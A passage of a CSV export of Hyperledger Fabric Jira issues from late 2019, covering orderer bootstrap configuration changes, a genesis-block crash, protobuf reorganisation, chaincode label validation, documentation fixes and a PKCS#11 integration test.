Hence we should change it to ORDERER_GENERAL_BOOTSTRAPMETHOD to avoid confusions.",,baohua,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16477,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0150r:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),baohua,denyeart,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Nov/19 3:22 AM;baohua;[https://github.com/hyperledger/fabric/pull/303];;;","28/Nov/19 11:46 PM;denyeart;PR merged, but please add a release note about the two config changes before closing out this Jira.;;;","03/Dec/19 3:33 AM;baohua;[https://github.com/hyperledger/fabric/pull/346];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
update map_private go chaincode for 2.0.0,FAB-17117,43403,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,dongming,dongming,dongming,21/Nov/19 3:17 AM,21/Nov/19 4:14 AM,28/Oct/23 3:09 AM,21/Nov/19 4:14 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"This is to update map_private go chaincode with
 * add go mod and sum

This changes is for 2.0.0 only",,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17027,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0150z:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"21/Nov/19 4:14 AM;dongming;withdraw, dup to FAB-17027;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Make CI scripts executable,FAB-17118,43404,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,btl5037,btl5037,21/Nov/19 3:38 AM,18/Jan/20 12:53 PM,28/Oct/23 3:09 AM,18/Jan/20 12:53 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01517:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Copy files to durable path after release, if Rename fails",FAB-17119,43405,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,guoger,guoger,guoger,21/Nov/19 4:52 AM,10/Dec/19 12:41 PM,28/Oct/23 3:09 AM,10/Dec/19 12:41 PM,,,,,,,,,,v2.0.0,,,,fabric-peer,,,,,,,,,0,ipm,,,,,"After release step in chaincode installation, contents of release dir are moved to durable path via rename. However, this would not work if oldpath and newpath are not on the same mounted filesystem, which sometimes is true in container, since build is done in tmpdir and durable path is always on persistent volume.

we should attempt to copy if move fails.",,guoger,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-13584,,,No,,Unset,No,,,"1|i00n2e:8zl",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),guoger,jyellick,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Nov/19 5:12 AM;guoger;solution should be straightforward but i'm a bit puzzled by test. any idea how to simulate failure? (not a big fan of permission and l'm looking for inspiration from http://man7.org/linux/man-pages/man2/rename.2.html)

cc [~jyellick];;;","21/Nov/19 5:20 AM;jyellick;This is generally a problem testing using reals, for instance, when we have multiple ioutil.TempDir calls in the same path, it's not obvious how to fail the second without failing the first.  If it can't be covered with a UT, we might just have to live with that.;;;","27/Nov/19 11:11 AM;guoger;https://github.com/hyperledger/fabric/pull/315;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move collection config proto from common to peer,FAB-17120,43406,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,caod,caod,21/Nov/19 6:35 AM,22/Nov/19 5:22 AM,28/Oct/23 3:09 AM,22/Nov/19 4:00 AM,,,,,,,,,,v2.0.0,,,,fabric-ledger,,,,,,,,,0,,,,,,"Counter to FAB-15066 where peer.ApplicationPolicy was moved to common.ApplicationPolicy, after some discussion with [~jyellick] it would have probably made more sense to move the common.StaticCollectionConfig to peer.StaticCollectionConfig since the collection config is a peer concept and really should never have lived in common (this would also leave peer.ApplicationPolicy as is and still prevent an import cycle as long as nothing in common imports StaticCollectionConfig which there isn't anything that does).

 

/cc [~sykesm] [~denyeart]",,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i008rj:iwy8",,,,Unset,Unset,v2.0,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,dependabot/bundler/docs/nokogiri-1.14.3,0.2.x,dependabot/bundler/docs/activesupport-6.0.6.1,dependabot/go_modules/bindings/go-apiv1/golang.org/x/text-0.3.8,0.1.x,dependabot/go_modules/golang.org/x/net-0.7.0,main,dependabot/go_modules/golang.org/x/text-0.3.8,dependabot/go_modules/bindings/go-apiv1/golang.org/x/net-0.7.0,dependabot/bundler/docs/commonmarker-0.23.9,dependabot/go_modules/bindings/go-apiv2/golang.org/x/net-0.7.0,release-2.3,release-2.2,dependabot/go_modules/bindings/go-apiv2/golang.org/x/text-0.3.8,github-settings,dependabot/go_modules/bindings/go-apiv2/golang.org/x/sys-0.1.0,dependabot/go_modules/golang.org/x/sys-0.1.0,dependabot/go_modules/bindings/go-apiv1/golang.org/x/sys-0.1.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"22/Nov/19 1:36 AM;caod;Followup JIRAs for updating references:

FABG-921

FAB-17123

FABJ-500

FABN-1420;;;","22/Nov/19 1:37 AM;caod;[https://github.com/hyperledger/fabric-protos/pull/17|https://github.com/hyperledger/fabric-protos/pull/17/files];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update fabric-sample with new raft config,FAB-17121,43407,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,baohua,baohua,baohua,21/Nov/19 8:33 AM,19/Apr/20 1:24 PM,28/Oct/23 3:09 AM,19/Apr/20 1:24 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"It includes two config changes in fabric recently:

* GenesisMethod --> BootstrapMethod

* GenesisFile --> BootstrapFile",,baohua,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16477,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0151v:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),baohua,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Nov/19 8:55 AM;baohua;[https://github.com/hyperledger/fabric-samples/pull/77];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Moving from gerrit to github,FAB-17122,43410,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,pandrejko,pandrejko,21/Nov/19 11:05 PM,04/Dec/20 4:26 AM,28/Oct/23 3:09 AM,04/Dec/20 4:26 AM,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,"Highlight tips and tricks that we learned from Brett:

+Add new remotes for Fabric repo:+

(standard githib process):

origin git@github.com:username/fabric.git (fetch)
 origin git@github.com:username/fabric.git (push)
 upstream git@github.com:hyperledger/fabric.git (fetch)
 upstream git@github.com:hyperledger/fabric.git (push)

 

+Committing your changes:+

When you create a commit you must sign the commit with a -s.

You can use commit --s ---amend to update your pr but you will have to include the --force option on the subsequent git push because {color:#1d1c1d} in git the force will overwrite the comment history if you do an amend. So GitHub makes sure you want to do it since it will overwrite some of the history. (Gerrit didn’t worry about it because you never overwrote the change history).{color}

If you need to upload the commit message later you need to download it and then re-commit it. (There is no way to edit it in github and save it.)

+Creating a new Pull Request (PR):+

[WIP] content:

The Gerritt [WIP] tag is no longer used. Instead, you can create a Draft PR and content is not sent to reviewers, until you are ready.
 When you create a PR you need to use the template in the PR

Reviewers (Maintainers) are now automatically assigned.

+Reviewing a PR:+

From the Files Changed tab:

When a new commit is added to a PR, the existing content is overwritten. Therefore any comments written that reference specific content in a file may no longer match the original location (and could have been changed by the commit). So the recommendation is that when you make a comment to *drag the plus sign to highlight the content you are commenting on and make your comment.* This preserves the reference text and comment in the PR feed. 
 # Use `Add a single comment` when no response is required.
 # Use  `Start a review` when a response is required.

+Process to view formatted documentation content+

From the Conversation tab:
 * Scroll down to `All checks have passed` and click `Show all checks`.
 * Scroll down to *`Pull-Request (DocBuild)`*  and click `Details` **
 * Under `DocBuild succeeded` click `0 errors/0 warnings`
 * On the screen that opens, under Artifacts click `[1 published |https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=2316&view=artifacts]`.
 * Next to `DocBuid` click the `Download` arrow.
 * Download and extract the build, click index.html to load the content.

+ Cherry picking content to another release branch:
git checkout release-2.0
git checkout -b <my2.0branch>
git cherry-pick <sha from master branch>
git push <my2.0branch> 

Reminder: as an author you can always do a local build to view your formatted content. See the fabric [README |[https://github.com/hyperledger/fabric/tree/master/docs] for instructions.

If you need to force a doc build type `/azp run` in the PR comment field

+How to +1 or -1 content content:+

When you are satisified with the content, (or unstaisfied) you can +1/-1 it by clicking the Thumbs up/Thumbs down icon on the initial Conversation tab content.

+Process to rebase and cherry-pick:+

Follow standard GitHub instructions.",,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwrrq:65jr",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Dec/20 4:26 AM;pandrejko;It's been a year now. Git Updates have been added to the Fabric docs here.

https://hyperledger-fabric.readthedocs.io/en/latest/github/github.html?highlight=Git%20
Closing this one.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update collection.proto message references,FAB-17123,43414,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,caod,caod,22/Nov/19 1:32 AM,22/Nov/19 10:43 PM,28/Oct/23 3:09 AM,22/Nov/19 10:43 PM,v2.0.0,,,,,,,,,v2.0.0,,,,,,,,,,,,,0,,,,,,"As part of FAB-17120 the collection.proto was moved from {{common}} to {{peer}} to prevent future import cycles. All messages in the old {{common/collection.proto}} have been marked as deprecated and the following type references will need to be updated:

{{common.CollectionConfigPackage -> peer.CollectionConfigPackage}}

{{common.CollectionConfig -> peer.CollectionConfig}}

{{common.StaticCollectionConfig -> peer.StaticCollectionConfig}}

{{common.CollectionPolicyConfig -> peer.CollectionPolicyConfig}}

 

The {{common.ApplicationPolicy}} type that was introduced in FAB-15066 has also been deprecated so will need to be reverted back to {{peer.ApplicationPolicy}} if they aren't already:

common.ApplicationPolicy -> peer.ApplicationPolicy

 

See PR for reference

[https://github.com/hyperledger/fabric-protos/pull/17|https://github.com/hyperledger/fabric-protos/pull/15]",,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0152r:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"fabric-test daily jobs, behave and pte and other tools regression tests: Unable to find the genesis block file, Failed to create deliver client for orderer in all feature tests",FAB-17124,43418,,Bug,Closed,FAB,Fabric,software,denyeart,,,Highest,Duplicate,,vijaypunugubati,vijaypunugubati,22/Nov/19 2:35 AM,03/Dec/19 1:13 AM,28/Oct/23 3:09 AM,03/Dec/19 1:02 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,ci-blocker,ci-failure,,,,"Example error messgaes are similar for many tests, e,g.:
 * Unable to find the genesis block file behavesystest.block
 * Unable to find the genesis block file configsz.block

In the orderer debug logs, we see this error in every test:
 * fabric-test-daily-behave-master job: Failed to create deliver client for orderer in all feature tests.

*Branch:* Master. Failures first occurred on Nov 21.

*Platform:* x86_64

*Error Snippet:*
{code:java}
/2019-11-21 02:27:40.883 UTC [grpc] createTransport -> DEBU 024 grpc: addrConn.createTransport failed to connect to {orderer0.example.com:7050 0  <nil>}. Err :connection error: desc = ""transport: error while dialing: dial tcp: lookup orderer0.example.com on 127.0.0.11:53: no such host"". Reconnecting...
2019-11-21 02:27:40.883 UTC [grpc] HandleSubConnStateChange -> DEBU 025 pickfirstBalancer: HandleSubConnStateChange: 0xc00032c600, TRANSIENT_FAILURE
Error: failed to create deliver client for orderer: orderer client failed to connect to orderer0.example.com:7050: failed to create new connection: connection error: desc = ""transport: error while dialing: dial tcp: lookup orderer0.example.com on 127.0.0.11:53: no such host""/ code placeholder
{code}
The ** above error snippet is observed on almost every test case failed in the daily-behave test suite except the bootstrap feature test in master.

*Build Logs:* [https://jenkins.hyperledger.org/view/fabric-test/job/fabric-test-daily-behave-master-x86_64/405/testReport/]

[https://logs.hyperledger.org/production/vex-yul-hyp-jenkins-3/fabric-test-daily-behave-master-x86_64/405/]

!Screen Shot 2019-11-21 at 12.34.18 PM.png|width=563,height=82!

 ",,rameshthoomu,scottz,vijaypunugubati,wlahti,,,,,,,,,,,,,,,,,,FAB-17125,,,,,,,,,,,,,,,,,,,,,FAB-16477,,,,,,,FAB-16477,FAB-17171,,,,,"22/Nov/19 2:34 AM;vijaypunugubati;Screen Shot 2019-11-21 at 12.34.18 PM.png;https://jira.hyperledger.org/secure/attachment/17965/Screen+Shot+2019-11-21+at+12.34.18+PM.png",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0153n:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),rameshthoomu,scottz,vijaypunugubati,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Nov/19 2:46 AM;vijaypunugubati;Please refer this CR merged yesterday in fabric repository which might break the entire feature test cases in master branch. [https://gerrit.hyperledger.org/r/#/c/fabric/+/33276/];;;","22/Nov/19 3:21 AM;rameshthoomu;I see the orderer bootstrap is failing and below is the orderer log

 
{code:java}
2019-11-21 16:54:18.455 UTC [orderer.common.server] initializeServerConfig -> INFO 003 Starting orderer with TLS enabled
panic: unable to bootstrap orderer. Error reading genesis block file: read /etc/hyperledger/fabric/genesisblock: is a directory
goroutine 1 [running]:
github.com/hyperledger/fabric/orderer/common/bootstrap/file.(*fileBootstrapper).GenesisBlock(0xc000138370, 0xc000138370)
 /go/src/github.com/hyperledger/fabric/orderer/common/bootstrap/file/bootstrap.go:39 +0x1c0
github.com/hyperledger/fabric/orderer/common/server.extractBootstrapBlock(0xc0002ac000, 0xc00025ac30)
 /go/src/github.com/hyperledger/fabric/orderer/common/server/main.go:595 +0x13f
github.com/hyperledger/fabric/orderer/common/server.Main()
 /go/src/github.com/hyperledger/fabric/orderer/common/server/main.go:128 +0x1247
main.main()
 /go/src/github.com/hyperledger/fabric/cmd/orderer/main.go:15 +0x20
{code}
 ;;;","22/Nov/19 11:55 PM;wlahti;This issue was discussed in the fabric-orderer channel on rocketchat and a fix was merged yesterday afternoon: [https://gerrit.hyperledger.org/r/c/fabric/+/34442];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Unable to bootstrap orderer - error reading genesis block file,FAB-17125,43420,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,,rameshthoomu,rameshthoomu,22/Nov/19 4:08 AM,22/Nov/19 11:54 PM,28/Oct/23 3:09 AM,22/Nov/19 11:54 PM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-orderer,,,,,,,,,0,,,,,,"Observed orderer is crashing with the below error while trying to bootstrap the orderer.

branch: master
{code:java}
2019-11-21 16:54:18.455 UTC [orderer.common.server] initializeServerConfig -> INFO 003 Starting orderer with TLS enabled
panic: unable to bootstrap orderer. Error reading genesis block file: read /etc/hyperledger/fabric/genesisblock: is a directory
goroutine 1 [running]:
github.com/hyperledger/fabric/orderer/common/bootstrap/file.(*fileBootstrapper).GenesisBlock(0xc000138370, 0xc000138370)
 /go/src/github.com/hyperledger/fabric/orderer/common/bootstrap/file/bootstrap.go:39 +0x1c0
github.com/hyperledger/fabric/orderer/common/server.extractBootstrapBlock(0xc0002ac000, 0xc00025ac30)
 /go/src/github.com/hyperledger/fabric/orderer/common/server/main.go:595 +0x13f
github.com/hyperledger/fabric/orderer/common/server.Main()
 /go/src/github.com/hyperledger/fabric/orderer/common/server/main.go:128 +0x1247
main.main()
 /go/src/github.com/hyperledger/fabric/cmd/orderer/main.go:15 +0x20
{code}
suspecting this change [https://gerrit.hyperledger.org/r/#/c/fabric/+/33276/] might have caused this issue.

 ",,rameshthoomu,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17124,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01543:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),rameshthoomu,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Nov/19 5:16 AM;wlahti;Looking into this.

Update: this is easily fixed in BYFN by changing the ORDERER_GENERAL_GENESISFILE env variable to ORDERER_GENERAL_BOOTSTRAP file. However, based on the comment in the newly merged code, the orderer was intended to stay compatible with the old configuration. I'll investigate further whether a change is needed in the orderer config code.;;;","22/Nov/19 11:54 PM;wlahti;It appears this was discussed in the fabric-orderer channel on rocketchat and a fix was merged yesterday afternoon: [https://gerrit.hyperledger.org/r/c/fabric/+/34442];;;","22/Nov/19 11:54 PM;wlahti;Closing this bug for now but please re-open if things aren't fully resolved.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Enforce character restrictions in label when packaging _lifecycle chaincode,FAB-17126,43421,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,MHBauer,MHBauer,22/Nov/19 6:19 AM,29/Jan/20 12:50 AM,28/Oct/23 3:09 AM,29/Jan/20 12:50 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-peer,,,,,,,,,0,ipm,,,,,"I used a label with spaces in it.

I do not know what a label is, but it is required.",,manish-sethi,MHBauer,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znk",,,,Unset,Unset,,"$ peer lifecycle chaincode package -p /opt/gopath/src/github.com/simple/ --label ""simple cc package"" simple
$ ls
simple
$ peer lifecycle chaincode install simple
Error: chaincode install failed with status: 500 - failed to invoke backing implementation of 'InstallChaincode': could not parse as a chaincode install package: invalid label 'simple cc package'. Label must be non-empty, can only consist of alphanumerics, symbols from '.+-_', and can only begin with alphanumerics",,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,MHBauer,wlahti,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Jan/20 12:33 AM;manish-sethi;/cc [~wlahti];;;","18/Jan/20 12:39 AM;wlahti;Labels cannot have spaces in them. Please use one of the acceptable symbols as noted by the error message:
{code:java}
.+-_{code}
 edit: Ah, I see. We aren't doing any validation on the label when packaging. The error is only returned when attempting to install the package with the invalid label.;;;","21/Jan/20 5:20 AM;wlahti;-I'm not sure that we actually want to add this validation in the CLI. The peer returns the expected error while attempting to install the package with an invalid label. I don't see any similar validation logic in other CLI calls (beyond ensuring strings aren't empty).- [~sykesm]-, what do you think?-

Discussed with Matt. Since this step is purely local (no server interaction) we should perform the label validation in the CLI while packaging the chaincode.;;;","29/Jan/20 12:12 AM;wlahti;master: [https://github.com/hyperledger/fabric/pull/576]
release-2.0: [https://github.com/hyperledger/fabric/pull/577];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Channel update tutorial - Remove hardcoding channel name in-between,FAB-17128,43423,,Documentation,Closed,FAB,Fabric,software,denyeart,,,High,Done,AnoopVijayan,maniankara,maniankara,22/Nov/19 6:36 AM,20/Dec/19 3:36 AM,28/Oct/23 3:09 AM,10/Dec/19 12:59 PM,,,,,,,,,,v1.4.5,,,,fabric-docs,,,,,,,,,0,,,,,,"The channel 'mychannel' is hardcoded in the middle of the channel update tutorial.
This:
{code}
echo '{""payload"":{""header"":{""channel_header"":{""channel_id"":""mychannel"", ""type"":2}},""data"":{""config_update"":'$(cat anchor_update.json)'}}}' | jq . > anchor_update_in_envelope.json
{code}
should be:
{code}
echo '{""payload"":{""header"":{""channel_header"":{""channel_id"":""'$CHANNEL_NAME'"", ""type"":2}},""data"":{""config_update"":'$(cat anchor_update.json)'}}}' | jq . > anchor_update_in_envelope.json
{code}
instead. Note the single quote ending and beginning before after the CHANNEL_NAME variable.
This looks like a silly typo, but when working with different channel names this can be a pain.",,AnoopVijayan,joe-alewine,maniankara,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0154j:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),AnoopVijayan,joe-alewine,maniankara,pandrejko,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"26/Nov/19 10:18 PM;AnoopVijayan;This is fixed in master: https://github.com/hyperledger/fabric/pull/301 I do not know the procedure to get it to 1.4.4. Can someone explain the process (I heard its via cherry-pick, but process is unknown) ;;;","03/Dec/19 6:48 AM;pandrejko;[~joe-alewine] Can you review this and see about getting it into 1.4.4 docs if it is still applicable?;;;","04/Dec/19 6:27 PM;AnoopVijayan;[~pandrejko] or [~joe-alewine] Do you guys need anything that needs to be done from my end? Thanks;;;","05/Dec/19 6:15 AM;joe-alewine;https://github.com/hyperledger/fabric/pull/368;;;","19/Dec/19 5:16 PM;AnoopVijayan;[~joe-alewine] [~pandrejko] Guys this is not fixed :(

Please read the NOTE again from my description (not in haste) about the single quotes.;;;","19/Dec/19 8:47 PM;joe-alewine;[~AnoopVijayan] Why should there be single quotes around an environment variable like that?;;;","19/Dec/19 11:02 PM;AnoopVijayan;[~joe-alewine] The variable substitution does not happen within single quotes in bash.

 
{code:java}
$ a=10; echo ""with double quotes: $a""; echo 'with single quotes: $a'
with double quotes: 10
with single quotes: $a
$
{code}
 

Actually, the single quote before the variable terminates the left string and the single quote after the variable is the beginning of another string leaving the variable CHANNEL_NAME without any quotes.

The fix is just one approach, there are many ways of doing it.

All of these hassles are due to using json with echo with variable substitution in bash.;;;","20/Dec/19 3:05 AM;joe-alewine;PR here: https://github.com/hyperledger/fabric/pull/437;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create an integration tests that configures PKCS#11 for the orderer and peers,FAB-17129,43434,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,sykesm,sykesm,23/Nov/19 5:28 AM,05/Oct/20 4:39 PM,28/Oct/23 3:09 AM,02/Jul/20 5:20 AM,v1.4.3,v2.0.0,,,,,,,,v1.4.7,v2.0.0,,,fabric-orderer,,,,,,,,,0,ipm,,,,,"While working on https://gerrit.hyperledger.org/r/c/fabric/+/34199, [~jyellick] discovered that PKCS11 integration may have been broken for some time.

To prevent future regression, we should introduce an integration test that configures and uses PKCS11 with SoftHSM. This test should run in CI but skipped locally if SoftHSM related environment variables aren't set.

{code}
$ env | grep PKCS11_
PKCS11_LIB=/usr/lib/softhsm/libsofthsm2.so
PKCS11_LABEL=ForFabric
PKCS11_PIN=98765432
{code}",,sykesm,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzohi",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,tsharris,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.2,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Jan/20 11:55 PM;tsharris;[https://github.com/hyperledger/fabric/pull/533] A draft PR exists that starts a peer with pkcs11 configured. ;;;","30/Jun/20 10:25 PM;tsharris;[https://github.com/hyperledger/fabric/pull/1471];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
